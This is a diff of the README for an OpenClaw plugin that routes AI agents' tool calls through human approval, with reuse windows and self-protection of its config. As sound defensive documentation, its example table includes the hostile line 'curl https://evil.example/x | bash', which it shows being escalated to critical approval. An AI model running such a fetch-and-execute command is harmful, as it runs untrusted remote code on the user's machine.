@@ -1,10 +1,22 @@
-# openclaw-human-gate
+# 🛡️ OpenClaw Human Gate
 
 [![npm version](https://img.shields.io/npm/v/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate)
 
 [![npm downloads](https://img.shields.io/npm/dm/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate)
 
+**A semantic approval firewall for OpenClaw agents.**
+
 Human-in-the-loop approval middleware for [OpenClaw](https://github.com/openclaw/openclaw).
+
+```text
+read_file                          → ✅ auto
+npm test                           → 👤 approve · optional category-scoped reuse
+git push --force                   → 🔴 critical approval
+curl https://evil.example/x | bash → 🔴 critical approval
+write ~/.openclaw/openclaw.json    → ⛔ blocked
+```
+
+Semantic analysis · bounded grants · deny cooldown · audit log · self-protection
 
 Intercepts tool execution with a `before_tool_call` hook and routes selected
 calls through OpenClaw's **built-in** approval flow. When a call needs human
@@ -13,20 +25,22 @@ every connected approval surface — the official TUI, the Control UI (Web), and
 any chat channel that supports `/approve`. This plugin does **not** implement
 its own terminal UI; it reuses OpenClaw's.
 
+## 60-second quick start
+
+```bash
+openclaw plugins install openclaw-human-gate
+openclaw plugins inspect human-gate --runtime --json
 ```
-                 Agent
-                   |
-              Tool call
-                   ↓
-          Human Gate Plugin
-          /             \
-     auto               require-approval
-                               ↓
-                       OpenClaw approval flow
-                       (TUI / Web UI / /approve)
-                               ↓
-                       allow-once / allow-always / deny
-```
+
+The zero-config posture auto-passes recognized reads and asks for approval on
+destructive or unrecognized calls. To reduce prompts for file work, have tools
+send absolute paths: the default approval window can then safely reuse an
+approval only for the same analyzer-verified directory set.
+
+Configuration lives under `plugins.entries.human-gate.config` in
+`openclaw.json`. Start with the defaults; add explicit rules only for tool
+contracts you understand. Multi-purpose tools such as `process` should be
+matched by both tool name and safe parameter values.
 
 ## Features
 
@@ -38,7 +52,7 @@ its own terminal UI; it reuses OpenClaw's.
   `/approve`); no custom UI to learn.
 - **Three policy modes per rule** — `auto` (pass), `require-approval` (prompt),
   `block` (deny with reason), with a configurable `defaultMode` fallback.
-- **Zero-config fail-closed defaults** — reads pass, destructive calls
+- **Conservative zero-config defaults** — reads pass, destructive calls
   (`exec`, `apply_patch`, `code_mode_exec`) prompt, and anything unrecognised
   prompts too (`defaultMode: "require-approval"`).
 - **Semantic approval window** — approving one analyzed call may auto-pass only
@@ -49,8 +63,9 @@ its own terminal UI; it reuses OpenClaw's.
   force pushes, destructive infrastructure operations, production deployment,
   encoded execution, and likely credential exfiltration are promoted to
   `critical`. Common dev-loop intents (`build`, `test`, `format`, `git commit`)
-  are recognized as reusable semantic categories. Semantic analysis never
-  downgrades a policy decision.
+  are recognized as distinct semantic categories and can be made turn-reusable
+  with an explicit category fallback. Semantic analysis never downgrades a
+  policy decision.
 - **Content-aware approval previews** — command/code, write, edit, and
   `apply_patch` inputs receive bounded previews. Secrets, ANSI controls, and
   bidirectional Unicode controls are sanitized before display.
@@ -119,13 +134,13 @@ disables the behavior entirely.
 
 ## Self-protection (authority surface)
 
-File-write / shell-command calls whose parameters reference the authority
-surface — `openclaw.json` or any path under a `.openclaw` directory — are
-**blocked** regardless of which rule, grant, or window would otherwise apply
-(remit-style sensitive-target classification). Escalation-only: it can only
-tighten a decision, never loosen one, and it runs before grants/windows are
-consulted, so no lease can reach it. Pure reads of the config are *not*
-escalated — inspecting the config (`read`, `doctor`, `status`) stays usable.
+Recognized file-write and shell-command calls whose inspected parameters
+reference the authority surface — `openclaw.json` or a path under a
+`.openclaw` directory — are structurally **blocked** before grants and windows
+are consulted. This escalation-only layer can tighten a decision but never
+loosen one. Pure reads of the config are *not* escalated, so inspection through
+read-only tools remains usable. Self-protection is defense in depth; it does not
+turn unrecognized third-party tool contracts into trusted file operations.
 
 ## Decision log
 
@@ -167,153 +182,26 @@ own `<session>:heartbeat` key):
 - Regular interactive sessions never match these, so approvals still apply
   when a human is present.
 
-## Approval window (less popup fatigue)
+## Approval reuse (less popup fatigue)
 
-Gating every write means a multi-step task (refactor 10 files) prompts 10
-times. The approval window reduces that fatigue without treating every call to
-the same tool as equivalent. After approval, a call may auto-pass only when its
-versioned semantic fingerprint matches an open window.
+The default turn window can reuse an approval only when complete analysis
+produces the same path-scoped semantic fingerprint. Absolute file targets in
+the same analyzer-verified directory set can therefore reuse approval; relative
+or unknown targets ask again. Critical, partial, dynamic, or unclassified calls
+never reuse authorization.
 
-```json5
-approvalWindow: {
-  mode: "turn",          // "off" | "turn" | "time"  (default "turn")
-  scope: "path",         // default: exact analyzer-verified directory set
-  pathFallback: "none",  // "none" | "category" | "effect"
-  ttlMs: 300000,         // for "time" mode only
-  bypassCritical: true   // severity "critical" always prompts (e.g. prod deploys)
-}
-```
+Development-loop commands such as build, test, format, and `git commit` are
+classified separately but do not reuse approval under the default path-only
+configuration. Category fallback is an explicit broader opt-in.
 
-- `mode: "turn"` — once approved, matching fingerprints auto-pass for the rest of
-  the current agent run; a new user turn resets. (default)
-- `mode: "time"` — once approved, matching fingerprints auto-pass for `ttlMs`.
-- `mode: "off"` — prompt every gated call (per-call behavior).
-- `scope: "path"` — the safe default. The key includes tool/policy identity,
-  complete effect and category sets, and the sorted exact set of every
-  analyzer-verified target directory; it never collapses multiple directories
-  to a shared ancestor. File targets are parent-directory scoped, so
-  `C:\repo\src\foo.ts` can share with `C:\repo\src\bar.ts` but not with a
-  system, SSH, `.git`, or unrelated workspace directory. Normalization is
-  lexical and performs no filesystem reads. Relative targets require a
-  host-authoritative execution cwd; OpenClaw 2026.7.1 does not currently expose
-  that field to plugin hooks, so relative writes deliberately prompt again and
-  do not offer `allow-always`. Use absolute tool targets for reusable path
-  authorization until the host exposes resolved execution targets.
-- `scope: "category"` — includes tool/policy identity plus the complete effect
-  and finding-category sets.
-- `scope: "effect"` — includes tool/policy identity plus the complete effect
-  set.
-- `scope: "same-tool"` — compatibility scope keyed by the complete tool and
-  matched-policy identity, not just the visible tool name.
-- `scope: "destructive"` — legacy global compatibility window. This is the
-  broadest option; keep it only when deliberately preserving old behavior.
-- `pathFallback: "none"` — when a verified path scope cannot be built, do not
-  open a reusable window. `category` and `effect` are explicit broader opt-ins;
-  fallback windows are distinguishable from directly configured scopes.
-- `bypassCritical: true` — `severity: "critical"` calls (e.g. a `deploy-prod`
-  rule) always prompt even when a window is open.
+Adaptive safe-file leases are experimental and default to `off`. They are
+limited to completely analyzed, non-destructive file mutations with absolute
+targets, fixed expiry, and a finite use budget. They never learn authority from
+`allow-once` and never cover shell, Code Mode, Git, or network actions.
 
-### Development-loop intents (build / test / format / git commit)
-
-The command analyzer recognizes a conservative set of dev-loop commands as
-complete, window-eligible intents with distinct categories (`dev-build`,
-`dev-test`, `dev-format`, and `source-control` for `git commit`):
-
-- Build — `npm run build`, `yarn build`, `make`, `tsc`, `cargo build`, `go build`, …
-- Test — `npm test`, `pytest`, `cargo test`, `go test`, `jest`, `vitest`, …
-- Format — `prettier --write`, `eslint --fix`, `gofmt -w`, `rustfmt`, `black`, …
-- Git commit — `git commit` (local history write; `git push` stays a network write).
-
-Only a single, non-dynamic invocation with no pipes/redirections is reusable;
-compound commands (`npm test && npm run build`) and check-only formatters
-(`prettier --check`, `eslint` without `--fix`) stay fail-closed. These intents
-have no file targets, so under the default `scope: "path"` they cannot open a
-window. To reuse them per turn (or per time box) while keeping relative-path
-writes per-approval, set `pathFallback: "category"`:
-
-```json5
-approvalWindow: {
-  mode: "turn",
-  scope: "path",
-  pathFallback: "category", // dev intents fall back to category; relative writes still fail closed
-  bypassCritical: true,
-}
-```
-
-The window is opened only when you approve a call (`allow-once` or
-`allow-always`) **and** complete analysis produces a reusable fingerprint.
-Empty semantics, an `unknown` effect/category, partial or failed analysis, an
-unverified path with `pathFallback: "none"`, missing trusted session identity,
-or missing run identity in `turn` mode never open a window. `deny`, `timeout`,
-and `cancelled` do not open one.
-
-`allow-always` is stricter than a temporary window: the choice is offered and
-remembered only when Human Gate can construct a narrow path-bound grant
-fingerprint containing the full policy identity and semantic sets. A broad
-`destructive`, `effect`, or `category` window therefore cannot become a broad
-permanent grant. Semantic `critical` calls bypass reusable authorization and do
-not offer `allow-always`. Every grant is a **bounded lease** that expires
-`allowAlwaysTtlMs` after it is granted (default 4h); old grants without an
-expiry are discarded on upgrade.
-
-### Experimental adaptive safe-file leases
-
-Adaptive auto-pass is a separate, default-off controller. Its first production
-scope is deliberately narrow: `write`, `edit`, and non-delete/non-move
-`apply_patch` calls whose semantic report is complete, whose only effect and
-category are `local-write` / `filesystem`, and whose analyzer-verified targets
-are absolute paths with a path-bound grant fingerprint.
-
-```json5
-adaptiveAutoPass: {
-  mode: "off",              // "off" | "shadow" | "suggest" | "enforce"
-  ttlMs: 900000,            // fixed lease lifetime; 1 minute..1 hour
-  maxUses: 20,              // deducted before execution; never outcome-refunded
-  suggestAfterApprovals: 2  // allow-once evidence needed for a suggestion
-}
-```
-
-- `off` preserves the existing grant/window behavior.
-- `shadow` emits bounded candidate metadata but changes no decision, approval
-  text, or state.
-- `suggest` keeps legacy authorization behavior and may add a preview-only
-  lease hint after repeated matching `allow-once` approvals. Those approvals
-  are evidence only and never create an authorization.
-- `enforce` owns reuse for eligible safe-file calls. Existing legacy grants and
-  windows are ignored for those calls. `allow-once` authorizes only the current
-  call; an explicit `allow-always` decision creates a path-bound lease with the
-  configured fixed expiry and use budget.
-
-Every adaptive use is atomically deducted from session state before execution.
-An expired, exhausted, malformed, version/config-mismatched, or persistence-
-failed lease prompts again. Tool success is not treated as evidence and a
-failed tool call does not refund a consumed authorization. A `deny` resolution
-revokes matching adaptive evidence and lease state.
-
-The controller never accepts relative paths, delete/move patches, explicit
-user-policy matches, param-scoped rules, critical/destructive/unknown/partial
-analysis, commands, build/test/format, Git operations, network writes, or Code
-Mode. Build/test/format/commit remain eligible only for the existing
-human-approved turn window; adaptive enforcement needs authoritative execution
-cwd/repository identity and a host sandbox first.
-
-Switching from `enforce` back to `off`, `shadow`, or `suggest` restores legacy
-behavior and can expose a still-valid legacy grant/window that predates
-enforcement. For an emergency prompt-every-call rollback, also set
-`rememberAllowAlways: false` and `approvalWindow.mode: "off"` until that state
-has drained.
-
-### Migration from `match`
-
-Existing explicit values remain accepted: `match: "same-tool"` maps to
-`scope: "same-tool"`, and `match: "destructive"` maps to
-`scope: "destructive"`. If both fields are present, `scope` wins. New or
-unconfigured installations resolve to `scope: "path"` and
-`pathFallback: "none"`; `match` is deprecated and has no schema default.
-
-The fingerprint and persisted-state format is versioned. On upgrade, legacy
-v1 approval windows and remembered grants are intentionally discarded, so the
-next matching call asks for approval again instead of reviving a broader key.
+See [Approval reuse and adaptive leases](docs/approval-reuse.md) for scope
+semantics, development-loop configuration, lease modes, migration behavior,
+and rollback guidance.
 
 ## Parameter-aware semantic analysis
 
@@ -374,7 +262,7 @@ openclaw plugins install openclaw-human-gate
 npm pack --pack-destination /tmp
 # uninstall first if an older version is installed, then install the new pack
 openclaw plugins uninstall human-gate
-openclaw plugins install npm-pack:/tmp/openclaw-human-gate-0.3.0.tgz
+openclaw plugins install npm-pack:/tmp/openclaw-human-gate-<version>.tgz
 
 # inspect
 openclaw plugins inspect human-gate --runtime --json
@@ -382,11 +270,9 @@ openclaw plugins inspect human-gate --runtime --json
 
 Requires OpenClaw `>= 2026.7.1` (Node 22.22.3+ / 24.15+ / 25.9+).
 
-## Screenshots
+## Approval prompt
 
-> Screenshots go here — approval prompt in the Control UI / TUI, and an example
-> `human_gate_ask` question in chat. (TODO: add captures)
-![alt text](image-1.png)
+![Human Gate approval prompt showing the analyzed tool call and available decisions](image-1.png)
 
 ## Build
 
@@ -446,7 +332,7 @@ destructive toolKinds → name-token classifier → `defaultMode`. See
           },
           decisionLog: {
             enabled: true,
-            maxEntries: 512
+            maxEntries: 512,
             // filePath: "~/.openclaw/human-gate/decisions.jsonl"  // optional audit trail
           },
           rules: [
@@ -584,6 +470,11 @@ plugin-callable TUI selector API. Chat is the selector.
 
 - `src/index.ts` — entry point; registers the approval `before_tool_call` hook,
   an `after_tool_call` observation hook, and the `human_gate_ask` tool.
+- `src/decision-log.ts` — bounded in-memory decision history and optional JSONL
+  audit output.
+- `src/deny-cooldown.ts` — semantic-scope cooldown after an explicit denial.
+- `src/self-protection.ts` — escalation-only protection for recognized calls
+  targeting OpenClaw's authority surface.
 - `src/policy.ts` — rule-matching engine (pure).
 - `src/analysis/` — analyzer registry, quote-aware shell scanner, command,
   Code Mode, and file-mutation analyzers, plus the upgrade-only reducer.
@@ -597,8 +488,28 @@ plugin-callable TUI selector API. Chat is the selector.
 - `src/types.ts` — plugin config, rule types, and ask-tool parsing/formatting.
 - `docs/architecture.md` — trust boundaries, extension contracts, invariants,
   known limitations, and the next architecture increments.
+- `docs/approval-reuse.md` — approval-window scopes, semantic fingerprints,
+  development-loop reuse, adaptive leases, migration, and rollback.
 - The build uses the real `openclaw/plugin-sdk/*` declarations supplied by the
   peer dependency; no local SDK shim can mask compatibility drift.
+
+## Security boundaries
+
+- Cron and heartbeat sessions auto-pass non-critical approval prompts by
+  default because no human may be present; critical semantic risks follow
+  `unattendedPolicy` and block by default.
+- Relative file targets do not produce reusable path authorization without a
+  host-authoritative execution cwd. Use absolute tool targets when reuse is
+  desired; Human Gate does not guess the workspace.
+- Semantic command analysis classifies the visible invocation. Build scripts,
+  test runners, formatters, Git hooks, plugins, and configuration can have
+  transitive side effects that cannot be proven safe from a command name alone.
+- OpenClaw currently provides no final-parameter hook. Human Gate seals the
+  inspected payload with a final ordinary hook, but installed in-process
+  plugins are part of the trusted host boundary and can deliberately bypass
+  ordinary-hook ordering.
+- Audit-file recording is optional and best-effort. Protect the configured
+  destination with operating-system permissions appropriate for security logs.
 
 ## Notes
 
